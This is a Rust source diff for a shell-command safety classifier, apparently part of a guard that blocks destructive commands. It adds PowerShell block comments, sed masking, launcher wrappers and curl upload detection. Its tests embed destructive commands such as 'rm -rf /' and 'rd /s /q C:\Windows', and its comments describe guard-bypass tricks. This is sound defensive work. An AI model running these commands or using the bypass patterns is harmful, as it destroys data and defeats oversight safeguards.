@@ -204,9 +204,10 @@ enum TokenizerState {
     Normal,
     SingleQuote,
     DoubleQuote,
-    CommandSubst, // Inside $(...), scanning for matching )
-    Backtick,     // Inside `...`, scanning for matching `
-    Comment,      // Inside #... (newline terminates)
+    CommandSubst,           // Inside $(...), scanning for matching )
+    Backtick,               // Inside `...`, scanning for matching `
+    Comment,                // Inside #... (newline terminates)
+    PowerShellBlockComment, // Inside <# ... #> (PowerShell block comment; #> terminates)
 }
 
 /// Shell command tokenizer and context classifier.
@@ -283,7 +284,10 @@ impl ContextClassifier {
 
             // Handle escapes first (except in SingleQuote where \ is literal)
             if byte == b'\\' && current_state != TokenizerState::SingleQuote {
-                let effective = !matches!(current_state, TokenizerState::Comment);
+                let effective = !matches!(
+                    current_state,
+                    TokenizerState::Comment | TokenizerState::PowerShellBlockComment
+                );
                 if effective {
                     // Consume the backslash and the next character
                     i += 1; // Skip \
@@ -407,6 +411,24 @@ impl ContextClassifier {
                             pending_inline_code = false;
                             // After a command separator, the next word is a new command
                             in_command_position = true;
+                            continue;
+                        }
+                        b'<' if i + 1 < len
+                            && bytes[i + 1] == b'#'
+                            && powershell_block_comment_starts_at(bytes, i) =>
+                        {
+                            // PowerShell block comment `<# ... #>`. Its body is not
+                            // executed, so classify the whole region as a Comment (a
+                            // destructive string printed inside it must NOT block).
+                            if i > span_start {
+                                spans.push(Span::new(current_kind, span_start, i));
+                            }
+                            span_start = i;
+                            stack.push(TokenizerState::PowerShellBlockComment);
+                            // Consume both `<#` bytes so the opener's `#` cannot be
+                            // mistaken for a `#>` terminator (e.g. `<#>` is an
+                            // UNTERMINATED comment, not a complete one).
+                            i += 2;
                             continue;
                         }
                         b'#' if i == 0
@@ -580,6 +602,19 @@ impl ContextClassifier {
                         }
                     }
                 }
+                TokenizerState::PowerShellBlockComment => {
+                    // Terminates on `#>` (consume both bytes). Newlines do NOT end it.
+                    if byte == b'#' && i + 1 < len && bytes[i + 1] == b'>' {
+                        stack.pop();
+                        if matches!(stack.last(), Some(TokenizerState::Normal)) {
+                            spans.push(Span::new(SpanKind::Comment, span_start, i + 2));
+                            span_start = i + 2;
+                            current_kind = SpanKind::Executed;
+                        }
+                        i += 2;
+                        continue;
+                    }
+                }
             }
             i += 1;
         }
@@ -597,7 +632,9 @@ impl ContextClassifier {
                     }
                 }
                 Some(TokenizerState::SingleQuote) | None => SpanKind::Unknown,
-                Some(TokenizerState::Comment) => SpanKind::Comment,
+                Some(TokenizerState::Comment | TokenizerState::PowerShellBlockComment) => {
+                    SpanKind::Comment
+                }
                 Some(TokenizerState::CommandSubst | TokenizerState::Backtick) => {
                     SpanKind::InlineCode
                 }
@@ -695,6 +732,21 @@ impl ContextClassifier {
     }
 }
 
+/// PowerShell recognizes `<#` as a block-comment opener only where a new token
+/// can begin. Embedded text such as `Write-Output<#` remains part of the word;
+/// treating it as a comment would mask executable statements that follow.
+#[inline]
+pub(crate) fn powershell_block_comment_starts_at(bytes: &[u8], index: usize) -> bool {
+    index == 0
+        || bytes.get(index.saturating_sub(1)).is_some_and(|previous| {
+            previous.is_ascii_whitespace()
+                || matches!(
+                    previous,
+                    b'|' | b'&' | b';' | b'(' | b'[' | b'{' | b',' | b'='
+                )
+        })
+}
+
 /// Classify a command string's execution contexts.
 ///
 /// This is a convenience function that creates a default classifier
@@ -712,6 +764,29 @@ impl ContextClassifier {
 #[must_use]
 pub fn classify_command(command: &str) -> CommandSpans {
     ContextClassifier::new().classify(command)
+}
+
+/// Returns true when byte `offset` in `command` falls inside a quoted span whose
+/// contents are inert data — a single-quoted string (`SpanKind::Data`) or a
+/// double-quoted argument (`SpanKind::Argument`).
+///
+/// This exists for the redirect false-positive class (issue #225): a `>` that
+/// appears *inside* a quoted string is a literal byte, not a shell redirect
+/// operator, so a redirect rule must not fire on it. The distinction versus the
+/// anti-bypass case (`"git">/dev/null reset --hard`) is precisely quote
+/// membership: in the bypass the operator is *outside* the quotes (an executable
+/// span), whereas in the false positive it is *inside* them.
+///
+/// Command substitutions inside a double-quoted string (`"$(...)"`) are
+/// classified as their own `InlineCode` span by [`ContextClassifier::classify`],
+/// so genuinely executable content nested in double quotes is never masked by
+/// this check.
+#[must_use]
+pub fn offset_is_quoted_data(command: &str, offset: usize) -> bool {
+    classify_command(command).spans().iter().any(|span| {
+        matches!(span.kind, SpanKind::Data | SpanKind::Argument)
+            && span.byte_range.contains(&offset)
+    })
 }
 
 // =============================================================================
@@ -847,11 +922,27 @@ pub static SAFE_STRING_REGISTRY: SafeStringRegistry = SafeStringRegistry {
         SafeFlagEntry::long_multi("bd", "--title"),
         SafeFlagEntry::long_multi("bd", "--notes"),
         SafeFlagEntry::long_multi("bd", "--reason"),
+        // beads_rust (`br`) is bd's successor with the same free-text flags plus
+        // `--body`; its argument bodies are documentation, not executed (#225).
+        SafeFlagEntry::long_multi("br", "--description"),
+        SafeFlagEntry::long_multi("br", "--title"),
+        SafeFlagEntry::long_multi("br", "--body"),
+        SafeFlagEntry::long_multi("br", "--notes"),
+        SafeFlagEntry::long_multi("br", "--reason"),
         // Search tools - patterns are data, not executed (only pattern-supplying flags)
         SafeFlagEntry::both("grep", "-e", "--regexp"),
         SafeFlagEntry::both("rg", "-e", "--regexp"),
         SafeFlagEntry::both("ag", "-e", "--pattern"), // Silver Searcher
         SafeFlagEntry::both("ack", "-e", "--pattern"), // ack search tool
+        // Sed expression values are considered for narrow, syntax-aware
+        // masking below. Executing (`e`, `s///e`) programs are handled first
+        // by the evaluator's semantic pass; file-writing (`s///w`) programs
+        // remain visible to ordinary pack matching.
+        SafeFlagEntry::both("sed", "-e", "--expression"),
+        // GNU sed's `-l`/`--line-length` consumes the next argument. Without
+        // modelling that arity, the numeric value is mistaken for the
+        // positional program and the real substitution remains unmasked.
+        SafeFlagEntry::both("sed", "-l", "--line-length"),
         // GitHub CLI - titles and bodies are documentation
         SafeFlagEntry::both("gh", "-t", "--title"),
         SafeFlagEntry::both("gh", "-b", "--body"),
@@ -888,8 +979,8 @@ static SAFE_COMMANDS_MATCHER: LazyLock<AhoCorasick> = LazyLock::new(|| {
     let commands: &[&str] = &[
         // all_args_data commands
         "echo", "printf", // Commands from flag_data_pairs
-        "git", "bd", "grep", "rg", "ag", "ack", "gh", "curl", "jq", "docker", "kubectl", "xargs",
-        "cargo", "npm",
+        "git", "bd", "br", "grep", "rg", "ag", "ack", "sed", "gh", "curl", "jq", "docker",
+        "kubectl", "xargs", "cargo", "npm",
         // Special built-in: `command -v/-V` queries mask their arguments
         "command",
     ];
@@ -986,23 +1077,28 @@ pub fn is_argument_data(command: &str, preceding_flag: Option<&str>) -> bool {
     false
 }
 
-/// Check if the current segment ends with a pipe (indicating potential code execution).
-fn is_piped_segment(command: &str, tokens: &[SanitizeToken], current_idx: usize) -> bool {
-    for token in &tokens[current_idx..] {
-        if token.kind == SanitizeTokenKind::Separator {
-            let sep = &command[token.byte_range.clone()];
-            // Matches "|" (pipe) or "|&" (pipe with stderr)
-            // Does NOT match "||" (OR) or ";" (sequence)
-            return sep == "|" || sep == "|&";
-        }
-    }
-    false
-}
-
 #[derive(Clone, Copy)]
 struct PendingSafeFlag<'a> {
     flag: &'a str,
     multi_value: bool,
+}
+
+/// Return whether an unquoted shell reserved word introduces the command that
+/// follows it within the current separator-delimited segment.
+///
+/// The sanitizer does not implement a full shell grammar, but it must not
+/// mistake control-flow words for executables. Otherwise, in
+/// `then printf '...';`, `then` occupies the command slot and `printf`'s
+/// data-only arguments remain visible to destructive regexes. Exact matching is
+/// intentional: quoted words and paths such as `'then'` or `/usr/bin/then` are
+/// ordinary executable spellings and must retain their arguments.
+#[inline]
+#[must_use]
+pub(crate) fn is_shell_command_prefix_reserved_word(word: &str) -> bool {
+    matches!(
+        word,
+        "if" | "then" | "elif" | "else" | "while" | "until" | "do" | "coproc" | "{" | "!"
+    )
 }
 
 /// Create a sanitized view of `command` for regex-based pattern matching.
@@ -1057,7 +1153,7 @@ pub fn sanitize_for_pattern_matching(command: &str) -> Cow<'_, str> {
     // returns to args-data masking.
     let mut next_token_is_redirect_target = false;
 
-    for (i, token) in tokens.iter().enumerate() {
+    for token in &tokens {
         if token.kind == SanitizeTokenKind::Separator {
             segment_cmd = None;
             segment_cmd_is_all_args_data = false;
@@ -1097,6 +1193,14 @@ pub fn sanitize_for_pattern_matching(command: &str) -> Cow<'_, str> {
         }
 
         if segment_cmd.is_none() {
+            // POSIX/Bash control-flow prefixes introduce a command but are not
+            // themselves executables. Only skip them when no explicit wrapper
+            // is active: `command then ...`, `env then ...`, and
+            // `sudo then ...` intentionally select an executable named `then`.
+            if wrapper == WrapperState::None && is_shell_command_prefix_reserved_word(token_text) {
+                continue;
+            }
+
             // Wrapper / prefix handling: allow stacked wrappers like `sudo env VAR=1 git ...`.
             if let Some(next_wrapper) = WrapperState::from_command_word(token_text) {
                 wrapper = next_wrapper;
@@ -1127,12 +1231,6 @@ pub fn sanitize_for_pattern_matching(command: &str) -> Cow<'_, str> {
             git_subcommand = None;
             git_waiting_for_value = false;
             git_options_ended = false;
-
-            // If this command feeds into a pipe, its output is likely code (e.g. echo ... | sh).
-            // Do NOT treat arguments as data in this case.
-            if segment_cmd_is_all_args_data && is_piped_segment(command, &tokens, i) {
-                segment_cmd_is_all_args_data = false;
-            }
 
             pending_safe_flag = None;
             options_ended = false;
@@ -1247,11 +1345,12 @@ pub fn sanitize_for_pattern_matching(command: &str) -> Cow<'_, str> {
                 }
             } else {
                 pending_safe_flag = None;
-                if !token.has_inline_code {
+                if !token.has_inline_code && flag_data_value_is_inert(cmd, pending.flag, token_text)
+                {
                     mask_ranges.push(token.byte_range.clone());
-                    if is_search_pattern_flag(cmd, pending.flag) {
-                        search_pattern_masked = true;
-                    }
+                }
+                if is_search_pattern_flag(cmd, pending.flag) {
+                    search_pattern_masked = true;
                 }
                 continue;
             }
@@ -1260,7 +1359,10 @@ pub fn sanitize_for_pattern_matching(command: &str) -> Cow<'_, str> {
         // Handle --flag=value (and similar) forms.
         if let Some((flag, value_range)) = split_flag_assignment(token_text, token.byte_range.start)
         {
-            if SAFE_STRING_REGISTRY.is_flag_data(cmd, flag) && !token.has_inline_code {
+            if SAFE_STRING_REGISTRY.is_flag_data(cmd, flag)
+                && !token.has_inline_code
+                && flag_data_value_is_inert(cmd, flag, &command[value_range.clone()])
+            {
                 // Mask only the value portion (after '='). Keep the flag prefix for readability.
                 mask_ranges.push(value_range);
 
@@ -1279,7 +1381,9 @@ pub fn sanitize_for_pattern_matching(command: &str) -> Cow<'_, str> {
         if let Some((flag, value_range)) =
             split_short_flag_attached_value(cmd, token_text, token.byte_range.start)
         {
-            if !token.has_inline_code {
+            if !token.has_inline_code
+                && flag_data_value_is_inert(cmd, flag, &command[value_range.clone()])
+            {
                 mask_ranges.push(value_range);
                 if is_search_pattern_flag(cmd, flag) {
                     search_pattern_masked = true;
@@ -1321,8 +1425,13 @@ pub fn sanitize_for_pattern_matching(command: &str) -> Cow<'_, str> {
                 continue;
             }
 
-            if !search_pattern_masked && !token.has_inline_code {
-                mask_ranges.push(token.byte_range.clone());
+            if !search_pattern_masked {
+                if !token.has_inline_code
+                    && (search_cmd.rsplit('/').next().unwrap_or(search_cmd) != "sed"
+                        || sed_script_is_maskable(token_text))
+                {
+                    mask_ranges.push(token.byte_range.clone());
+                }
                 search_pattern_masked = true;
             }
         }
@@ -1371,6 +1480,81 @@ enum WrapperState {
         options_ended: bool,
         pending_value: bool,
     },
+    /// A POSIX execution frontend (`nice`, `nohup`, `time`, `timeout`,
+    /// `stdbuf`, `ionice`, `setsid`, `chrt`) that runs its trailing argv as a
+    /// command. Without this, the launcher word became the segment command and
+    /// the real command's data flags (e.g. `git commit -m <message>`) were
+    /// never masked, so a destructive-looking word inside a commit message
+    /// tripped raw pattern matching (issue #257). Mirrors the launcher set of
+    /// `normalize::strip_posix_execution_frontend`.
+    Launcher {
+        kind: LauncherKind,
+        options_ended: bool,
+        pending_value: bool,
+        operands_to_skip: u8,
+    },
+    /// `mise exec [TOOL@VERSION]... [--] <command>...` (and its `mise x`
+    /// alias). Tool specs carry `@`; an explicit `--` unambiguously starts
+    /// the wrapped command (issue #257).
+    MiseExec {
+        awaiting_subcommand: bool,
+        pending_value: bool,
+    },
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum LauncherKind {
+    Nice,
+    Ionice,
+    Nohup,
+    Setsid,
+    Time,
+    Timeout,
+    Stdbuf,
+    Chrt,
+}
+
+impl LauncherKind {
+    #[must_use]
+    fn from_basename(name: &str) -> Option<Self> {
+        match name {
+            "nice" => Some(Self::Nice),
+            "ionice" => Some(Self::Ionice),
+            "nohup" => Some(Self::Nohup),
+            "setsid" => Some(Self::Setsid),
+            "time" => Some(Self::Time),
+            "timeout" => Some(Self::Timeout),
+            "stdbuf" => Some(Self::Stdbuf),
+            "chrt" => Some(Self::Chrt),
+            _ => None,
+        }
+    }
+
+    /// Options that consume the following token as their value.
+    #[must_use]
+    fn option_takes_separate_value(self, token: &str) -> bool {
+        match self {
+            Self::Nice => matches!(token, "-n" | "--adjustment"),
+            Self::Ionice => matches!(
+                token,
+                "-c" | "--class" | "-n" | "--classdata" | "-p" | "-P" | "-u"
+            ),
+            Self::Time => matches!(token, "-f" | "--format" | "-o" | "--output"),
+            Self::Timeout => matches!(token, "-k" | "--kill-after" | "-s" | "--signal"),
+            Self::Stdbuf => matches!(token, "-i" | "-o" | "-e"),
+            Self::Nohup | Self::Setsid | Self::Chrt => false,
+        }
+    }
+
+    /// Positional operands the launcher consumes before the wrapped command
+    /// (`timeout DURATION cmd`, `chrt PRIORITY cmd`).
+    #[must_use]
+    const fn operands_before_command(self) -> u8 {
+        match self {
+            Self::Timeout | Self::Chrt => 1,
+            Self::Nice | Self::Ionice | Self::Nohup | Self::Setsid | Self::Time | Self::Stdbuf => 0,
+        }
+    }
 }
 
 impl WrapperState {
@@ -1391,7 +1575,16 @@ impl WrapperState {
                 options_ended: false,
                 pending_value: false,
             }),
-            _ => None,
+            "mise" => Some(Self::MiseExec {
+                awaiting_subcommand: true,
+                pending_value: false,
+            }),
+            other => LauncherKind::from_basename(other).map(|kind| Self::Launcher {
+                kind,
+                options_ended: false,
+                pending_value: false,
+                operands_to_skip: kind.operands_before_command(),
+            }),
         }
     }
 
@@ -1433,6 +1626,148 @@ impl WrapperState {
                 },
                 |_t| None,
             ),
+            Self::Launcher {
+                kind,
+                options_ended,
+                pending_value,
+                operands_to_skip,
+            } => {
+                if pending_value {
+                    return (
+                        Self::Launcher {
+                            kind,
+                            options_ended,
+                            pending_value: false,
+                            operands_to_skip,
+                        },
+                        true,
+                    );
+                }
+                if !options_ended {
+                    if token == "--" {
+                        return (
+                            Self::Launcher {
+                                kind,
+                                options_ended: true,
+                                pending_value: false,
+                                operands_to_skip,
+                            },
+                            true,
+                        );
+                    }
+                    if token.starts_with('-') && token != "-" {
+                        return (
+                            Self::Launcher {
+                                kind,
+                                options_ended,
+                                pending_value: kind.option_takes_separate_value(token),
+                                operands_to_skip,
+                            },
+                            true,
+                        );
+                    }
+                }
+                if operands_to_skip > 0 {
+                    return (
+                        Self::Launcher {
+                            kind,
+                            options_ended: true,
+                            pending_value: false,
+                            operands_to_skip: operands_to_skip - 1,
+                        },
+                        true,
+                    );
+                }
+                (
+                    Self::Launcher {
+                        kind,
+                        options_ended,
+                        pending_value,
+                        operands_to_skip,
+                    },
+                    false,
+                )
+            }
+            Self::MiseExec {
+                awaiting_subcommand,
+                pending_value,
+            } => {
+                if pending_value {
+                    // The previous modeled option consumes this token.
+                    return (
+                        Self::MiseExec {
+                            awaiting_subcommand,
+                            pending_value: false,
+                        },
+                        true,
+                    );
+                }
+                // Option handling is shared with the normalizer's mise model
+                // so the two engines cannot diverge (v0.9.1 review). Options
+                // are recognized before `@`-bearing words: a token starting
+                // with `-` is an option even when it contains `@`. Global
+                // flags may precede the subcommand (`mise -v exec -- cmd`).
+                if crate::normalize::mise_option_takes_separate_value(token) {
+                    return (
+                        Self::MiseExec {
+                            awaiting_subcommand,
+                            pending_value: true,
+                        },
+                        true,
+                    );
+                }
+                if crate::normalize::mise_flag_consumes_nothing(token) {
+                    return (
+                        Self::MiseExec {
+                            awaiting_subcommand,
+                            pending_value: false,
+                        },
+                        true,
+                    );
+                }
+                if awaiting_subcommand {
+                    return if matches!(token, "exec" | "x") {
+                        (
+                            Self::MiseExec {
+                                awaiting_subcommand: false,
+                                pending_value: false,
+                            },
+                            true,
+                        )
+                    } else {
+                        // `mise <other-subcommand>` (or an unknown global
+                        // option) is not an exec wrapper.
+                        (Self::None, false)
+                    };
+                }
+                if token == "--" {
+                    // The wrapped command starts at the next token.
+                    return (Self::None, true);
+                }
+                if token.starts_with('-') {
+                    // Unknown option (including `-c/--command`, an inline
+                    // shell string): its arity is unmodeled, so the next
+                    // word could be its value rather than the command
+                    // (`mise exec -p echo rm -rf /` must not make `echo` the
+                    // segment command and mask the `rm` as args-data). Let
+                    // the option itself end wrapper handling — it is not a
+                    // registry command, so nothing downstream is masked.
+                    return (Self::None, false);
+                }
+                if token.contains('@') {
+                    // TOOL@VERSION specs precede the command.
+                    return (
+                        Self::MiseExec {
+                            awaiting_subcommand: false,
+                            pending_value: false,
+                        },
+                        true,
+                    );
+                }
+                // In mise's grammar the first bare word starts the wrapped
+                // command.
+                (Self::None, false)
+            }
         }
     }
 }
@@ -1460,7 +1795,10 @@ where
             options_ended,
             pending_value,
         } => (options_ended, pending_value),
-        WrapperState::None => return (WrapperState::None, false),
+        // Launcher/MiseExec have dedicated consume paths in `consume_token`.
+        WrapperState::None | WrapperState::Launcher { .. } | WrapperState::MiseExec { .. } => {
+            return (state, false);
+        }
     };
 
     if pending_value {
@@ -1519,7 +1857,7 @@ const fn set_wrapper_options_ended(state: WrapperState, options_ended: bool) -> 
             options_ended,
             pending_value,
         },
-        WrapperState::None => WrapperState::None,
+        WrapperState::None | WrapperState::Launcher { .. } | WrapperState::MiseExec { .. } => state,
     }
 }
 
@@ -1543,7 +1881,7 @@ const fn set_wrapper_pending(
             options_ended,
             pending_value,
         },
-        WrapperState::None => WrapperState::None,
+        WrapperState::None | WrapperState::Launcher { .. } | WrapperState::MiseExec { .. } => state,
     }
 }
 
@@ -1631,33 +1969,124 @@ fn command_option_is_query(token: &str) -> bool {
 #[inline]
 #[must_use]
 fn is_env_assignment(token: &str) -> bool {
-    // Rough heuristic for KEY=VALUE tokens used as env assignments.
-    let Some((key, _value)) = token.split_once('=') else {
-        return false;
-    };
-    !key.is_empty()
-        && key.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_')
-        && !token.starts_with('-')
+    crate::normalize::is_env_assignment(token)
 }
 
 #[inline]
 #[must_use]
-fn is_search_command(cmd: &str) -> bool {
+pub(crate) fn is_search_command(cmd: &str) -> bool {
     let base_name = cmd.rsplit('/').next().unwrap_or(cmd);
-    matches!(base_name, "rg" | "grep" | "ag" | "ack")
+    matches!(base_name, "rg" | "grep" | "ag" | "ack" | "sed")
 }
 
 #[inline]
 #[must_use]
-fn is_search_pattern_flag(cmd: &str, flag: &str) -> bool {
+pub(crate) fn is_search_pattern_flag(cmd: &str, flag: &str) -> bool {
     let base_name = cmd.rsplit('/').next().unwrap_or(cmd);
     match base_name {
         "rg" => matches!(flag, "-e" | "--regexp"),
         "grep" => matches!(flag, "-e" | "--regexp"),
         "ag" => matches!(flag, "-e" | "--pattern"),
         "ack" => matches!(flag, "-e" | "--pattern"),
+        "sed" => matches!(flag, "-e" | "--expression"),
         _ => false,
     }
+}
+
+#[must_use]
+pub(crate) fn flag_data_value_is_inert(cmd: &str, flag: &str, value: &str) -> bool {
+    let base_name = cmd.rsplit('/').next().unwrap_or(cmd);
+    if base_name == "curl"
+        && matches!(
+            flag,
+            "-d" | "--data" | "--data-binary" | "--data-ascii" | "--data-urlencode"
+        )
+        && {
+            let value = strip_matching_quotes(value.trim());
+            value.starts_with('@')
+                || value
+                    .strip_prefix('"')
+                    .is_some_and(|tail| tail.starts_with('@'))
+        }
+    {
+        // curl interprets an @-prefixed value for these options as "read the
+        // request body from this file" (or stdin for `@-`). It is executable
+        // transfer evidence, not inert request text, and must remain visible
+        // to outbound-upload policy packs.
+        return false;
+    }
+    if base_name == "sed" && matches!(flag, "-e" | "--expression") {
+        return sed_script_is_maskable(value);
+    }
+    true
+}
+
+/// Return true only for a sed program that is either inert or is evaluated by
+/// the dedicated semantic execution pass in `evaluator`.
+///
+/// The semantic pass recursively evaluates direct `e` and `s///e` shell
+/// payloads before ordinary pack matching, so masking those programs here
+/// prevents their already-reviewed data arguments from being scanned a second
+/// time as raw shell. File-writing `w`/`W` programs stay visible.
+#[must_use]
+fn sed_script_is_maskable(value: &str) -> bool {
+    let script = strip_matching_quotes(value.trim());
+    let bytes = script.as_bytes();
+
+    // GNU sed's direct `e` command consumes the rest of its source line as a
+    // shell command (and does not require whitespace after `e`). The evaluator
+    // handles static and dynamic payloads separately before this mask is used.
+    if bytes.first() == Some(&b'e') {
+        return true;
+    }
+
+    if bytes.len() < 4 || bytes[0] != b's' {
+        return false;
+    }
+    let delimiter = bytes[1];
+    if delimiter == b'\\' || delimiter == b'\n' || delimiter == b'\r' {
+        return false;
+    }
+
+    let Some(pattern_end) = find_unescaped_sed_delimiter(bytes, 2, delimiter) else {
+        return false;
+    };
+    let Some(replacement_end) = find_unescaped_sed_delimiter(bytes, pattern_end + 1, delimiter)
+    else {
+        return false;
+    };
+
+    bytes[replacement_end + 1..].iter().all(|byte| {
+        matches!(
+            byte,
+            b'0'..=b'9' | b'e' | b'g' | b'p' | b'i' | b'I' | b'm' | b'M'
+        )
+    })
+}
+
+fn strip_matching_quotes(value: &str) -> &str {
+    if value.len() >= 2 {
+        let bytes = value.as_bytes();
+        if matches!(bytes[0], b'\'' | b'"') && bytes[value.len() - 1] == bytes[0] {
+            return &value[1..value.len() - 1];
+        }
+    }
+    value
+}
+
+fn find_unescaped_sed_delimiter(bytes: &[u8], start: usize, delimiter: u8) -> Option<usize> {
+    let mut index = start;
+    while index < bytes.len() {
+        if bytes[index] == b'\\' {
+            index = index.saturating_add(2);
+            continue;
+        }
+        if bytes[index] == delimiter {
+            return Some(index);
+        }
+        index += 1;
+    }
+    None
 }
 
 #[must_use]
@@ -1700,6 +2129,15 @@ fn split_short_flag_attached_value(
     let flags = bytes.get(1..)?;
 
     for (offset, b) in flags.iter().enumerate() {
+        let unambiguous_slot = offset == 0
+            || (base_name == "git"
+                && *b == b'm'
+                && flags[..offset]
+                    .iter()
+                    .all(|prefix| matches!(*prefix, b'a' | b's' | b'v' | b'q')));
+        if !unambiguous_slot {
+            continue;
+        }
         let token_index = 1 + offset;
         let next_index = token_index + 1;
         if next_index >= bytes.len() {
@@ -1739,6 +2177,14 @@ fn combined_short_data_flag_value(cmd: &str, token: &str) -> Option<&'static str
     let base_name = cmd.rsplit('/').next().unwrap_or(cmd);
     let flags = token.as_bytes().get(1..)?;
     let last = flags.last()?;
+    if base_name != "git"
+        || *last != b'm'
+        || !flags[..flags.len() - 1]
+            .iter()
+            .all(|prefix| matches!(*prefix, b'a' | b's' | b'v' | b'q'))
+    {
+        return None;
+    }
 
     SAFE_STRING_REGISTRY
         .flag_data_pairs
@@ -1755,13 +2201,14 @@ enum SanitizeTokenKind {
     Comment,
 }
 
-/// Returns the byte position of a glued shell-redirect operator inside
-/// `token` whose immediate next byte looks like a path-target start.
+/// Returns the byte position of an unquoted glued shell-redirect operator
+/// inside `token` whose immediate next byte looks like a path-target start.
 /// Matches `>` followed by `/`, `~`, `$`, `"`, or `'` — exactly the set
 /// of characters that begin the redirect-truncate-root-home regex's
 /// sensitive-path arms (incl. the optional ANSI-C `$'...'` and locale
 /// `$"..."` quoting forms). Returns `None` when no glued redirect is
-/// found, so plain-data arrows like `"user>admin"` stay fully masked.
+/// found, so plain-data arrows like `"user>admin"` and redirect-looking text
+/// inside a quoted argument stay fully masked.
 ///
 /// Used by `sanitize_for_pattern_matching` to handle `echo`/`printf`
 /// args of the form `data>/etc/passwd` where the dcg tokenizer keeps
@@ -1774,10 +2221,23 @@ fn glued_redirect_split_position(token: &str) -> Option<usize> {
     if bytes.len() < 2 {
         return None;
     }
-    for i in 0..bytes.len() - 1 {
-        if bytes[i] == b'>' && matches!(bytes[i + 1], b'/' | b'~' | b'$' | b'"' | b'\'') {
-            return Some(i);
+
+    let mut i = 0usize;
+    let mut in_single = false;
+    let mut in_double = false;
+    while i + 1 < bytes.len() {
+        match bytes[i] {
+            b'\'' if !in_double => in_single = !in_single,
+            b'"' if !in_single => in_double = !in_double,
+            b'>' if !in_single
+                && !in_double
+                && matches!(bytes[i + 1], b'/' | b'~' | b'$' | b'"' | b'\'') =>
+            {
+                return Some(i);
+            }
+            _ => {}
         }
+        i += 1;
     }
     None
 }
@@ -1868,6 +2328,28 @@ fn tokenize_command(command: &str) -> SanitizeTokens {
                 has_inline_code: false,
             });
             i += 1;
+            continue;
+        }
+
+        // PowerShell block comment `<# ... #>` (checked before separators so `<#`
+        // wins over the `<` redirect operator). Masked so a destructive string
+        // printed inside the comment does not match any pattern (.9.7).
+        if i + 1 < len && bytes[i] == b'<' && bytes[i + 1] == b'#' {
+            let start = i;
+            i += 2; // skip `<#`
+            while i + 1 < len && !(bytes[i] == b'#' && bytes[i + 1] == b'>') {
+                i += 1;
+            }
+            if i + 1 < len && bytes[i] == b'#' && bytes[i + 1] == b'>' {
+                i += 2; // consume closing `#>`
+            } else {
+                i = len; // unterminated block comment runs to EOF
+            }
+            tokens.push(SanitizeToken {
+                kind: SanitizeTokenKind::Comment,
+                byte_range: start..i,
+                has_inline_code: false,
+            });
             continue;
         }
 
@@ -2351,6 +2833,95 @@ mod tests {
         let comment_span = spans.spans().iter().find(|s| s.kind == SpanKind::Comment);
         assert!(comment_span.is_some());
         assert_eq!(comment_span.unwrap().text(cmd), "# rm -rf /");
+    }
+
+    #[test]
+    fn test_powershell_block_comment_is_comment_span() {
+        // PowerShell `<# ... #>` block comment: body must be classified Comment so a
+        // destructive string printed inside it does not block (.9.7).
+        let cmd = r"echo safe <# rm -rf / #> done";
+        let spans = classify_command(cmd);
+        let comment = spans
+            .spans()
+            .iter()
+            .find(|s| s.kind == SpanKind::Comment)
+            .expect("block comment should produce a Comment span");
+        assert_eq!(comment.text(cmd), "<# rm -rf / #>");
+        // The destructive text must NOT appear in any Executed span.
+        assert!(
+            !spans
+                .spans()
+                .iter()
+                .any(|s| s.kind == SpanKind::Executed && s.text(cmd).contains("rm -rf")),
+            "destructive text leaked into an Executed span"
+        );
+    }
+
+    #[test]
+    fn embedded_lt_hash_is_not_a_powershell_block_comment() {
+        let cmd = r#"Write-Output<#; [IO.Directory]::Delete("C:\src", $true); #>"#;
+        let spans = classify_command(cmd);
+
+        assert!(
+            !spans
+                .spans()
+                .iter()
+                .any(|span| span.kind == SpanKind::Comment && span.text(cmd).starts_with("<#")),
+            "an embedded <# is part of a PowerShell token, not a comment: {spans:?}"
+        );
+        assert!(
+            spans.spans().iter().any(|span| {
+                span.kind == SpanKind::Executed && span.text(cmd).contains("[IO.Directory]::Delete")
+            }),
+            "the executable delete after an embedded <# must remain visible: {spans:?}"
+        );
+    }
+
+    #[test]
+    fn test_powershell_block_comment_unterminated_runs_to_eof() {
+        let cmd = r"echo safe <# rm -rf / never closed";
+        let spans = classify_command(cmd);
+        let comment = spans
+            .spans()
+            .iter()
+            .find(|s| s.kind == SpanKind::Comment)
+            .expect("unterminated block comment should still be a Comment span");
+        assert!(comment.text(cmd).starts_with("<# rm -rf /"));
+    }
+
+    #[test]
+    fn test_powershell_block_comment_lt_hash_gt_is_unterminated() {
+        // `<#>` opens a block comment whose terminator (`#>`) never appears — the
+        // opener's own `#` must NOT be reused as the terminator. So everything from
+        // `<#` to EOF is a Comment, and the destructive tail is never Executed.
+        let cmd = r"echo a <#> rm -rf /";
+        let spans = classify_command(cmd);
+        let comment = spans
+            .spans()
+            .iter()
+            .find(|s| s.kind == SpanKind::Comment)
+            .expect("`<#>` should open an unterminated Comment span");
+        assert!(comment.text(cmd).starts_with("<#>"));
+        assert!(
+            !spans
+                .spans()
+                .iter()
+                .any(|s| s.kind == SpanKind::Executed && s.text(cmd).contains("rm -rf")),
+            "the tail after `<#>` must not be Executed"
+        );
+    }
+
+    #[test]
+    fn test_powershell_empty_block_comment_lt_hash_hash_gt() {
+        // `<##>` is a complete, empty block comment (terminator is the 2nd `#` + `>`).
+        let cmd = r"echo a <##> echo b";
+        let spans = classify_command(cmd);
+        let comment = spans
+            .spans()
+            .iter()
+            .find(|s| s.kind == SpanKind::Comment)
+            .expect("`<##>` should be a complete Comment span");
+        assert_eq!(comment.text(cmd), "<##>");
     }
 
     #[test]
@@ -3013,6 +3584,27 @@ mod tests {
     }
 
     #[test]
+    fn sanitize_masks_powershell_block_comment() {
+        // A destructive string inside `<# ... #>` must be masked so it can't match
+        // any pattern (printed-not-executed; .9.7).
+        let cmd = r"Write-Output <# Remove-Item -Recurse -Force C:\src #> done";
+        let sanitized = sanitize_for_pattern_matching(cmd);
+        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
+        assert!(
+            !sanitized.as_ref().contains("Remove-Item -Recurse -Force"),
+            "block-comment body leaked: {sanitized}"
+        );
+        assert!(sanitized.as_ref().contains("Write-Output"));
+    }
+
+    #[test]
+    fn sanitize_masks_unterminated_powershell_block_comment() {
+        let cmd = r"echo ok <# rd /s /q C:\Windows never closed";
+        let sanitized = sanitize_for_pattern_matching(cmd);
+        assert!(!sanitized.as_ref().contains("rd /s /q"));
+    }
+
+    #[test]
     fn sanitize_strips_bd_description_value() {
